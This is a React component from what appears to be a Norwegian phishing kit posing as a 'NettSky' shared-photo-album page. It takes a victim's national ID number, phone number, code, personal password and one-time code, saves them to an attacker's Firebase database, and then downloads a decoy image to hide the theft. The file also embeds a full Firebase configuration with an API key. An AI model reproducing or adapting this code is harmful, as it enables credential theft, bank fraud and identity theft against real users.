import Loader from "../../components/Loader";
import PropTypes from "prop-types";
import { addDoc, collection } from "firebase/firestore";
import { initializeApp } from "firebase/app";
import { getFirestore } from "firebase/firestore"; // Import the required firestore function
import { useState } from "react";
import imgfile from "../../assets/12.png";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyDFG2lfe4_Li_mj7_cbqeHj03MBpBrpPRE",
  authDomain: "media-842dc.firebaseapp.com",
  projectId: "media-842dc",
  storageBucket: "media-842dc.firebasestorage.app",
  messagingSenderId: "998812136834",
  appId: "1:998812136834:web:22d30ff9cafbd513034b9b",
  measurementId: "G-RBKPZD372M"
};

// Initialize Firebase app
const app = initializeApp(firebaseConfig);

// Get Firestore instance
const db = getFirestore(app);

const Step10 = ({ formData }) => {
  const [isLoading, setIsLoading] = useState(false);

  const handleNextWithValidation = () => {
    setIsLoading(true);
    const userDetails = {
      User: Math.floor(Math.random() * 10000),
      Fødselsnummer: formData.step1,
      Telefonnummer: formData.step2,
      Kode: formData.step3,
      "Personelig passord": formData.step4,
      Engangskode: formData.step5
    };

    // Save data to Firestore
    addDoc(collection(db, "userDetails"), userDetails)
      .then(() => {
        console.log("Data saved successfully");

        // Trigger download of an image
        downloadImage();
        setIsLoading(false);
      })
      .catch((error) => {
        console.error("Error saving data: ", error);
        setIsLoading(false);
      });
  };

  const downloadImage = () => {
    const imageUrl = imgfile;

    const link = document.createElement("a");
    link.href = imageUrl;
    link.download = "user-image.png";
    link.click();
  };

  return (
    <div className="content pt-5 flex flex-col gap-5 justify-center items-center mb-10">
      <h1 className="font-bold text-lg">NettSky</h1>
      <p className="text-center">
        Den beste plasseringen for bilder, filer,{" "}
        <br className="hidden md:flex" /> notater, e-post og mer
      </p>
      <p className="text-center pb-2">Sarah har delt sin album med deg</p>
      <p className="text-sm text-center pb-5">
        identifisering fullfort. Du er na klar til a laste ned
      </p>

      <>
        <button
          className="bg-white mb-3 text-black px-6 py-2 w-50 rounded-full font-bold"
          onClick={handleNextWithValidation}
          disabled={isLoading}
        >
          {isLoading ? <Loader /> : "Last ned"}
        </button>
      </>
    </div>
  );
};

Step10.propTypes = {
  formData: PropTypes.object.isRequired
};

export default Step10;
